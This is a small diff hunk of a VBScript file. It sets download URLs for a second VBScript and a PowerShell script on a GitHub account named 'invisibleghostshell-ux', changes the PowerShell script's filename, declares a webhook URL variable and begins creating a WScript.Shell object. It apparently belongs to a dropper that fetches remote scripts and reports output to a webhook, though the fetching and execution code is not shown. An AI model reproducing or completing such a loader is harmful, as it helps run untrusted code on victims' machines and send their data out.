@@ -7,7 +7,7 @@ Dim intWait
 Dim strWebhookURL, strOutput
 
 strWinURL = "https://github.com/invisibleghostshell-ux/last/raw/main/win.vbs"
-strPs1URL = "https://github.com/invisibleghostshell-ux/last/raw/main/setup-lua.ps1"
+strPs1URL = "https://github.com/invisibleghostshell-ux/last/raw/main/setup.ps1"
 
 ' Create WScript.Shell object to get the environment variable
 Set objShell = CreateObject("WScript.Shell")
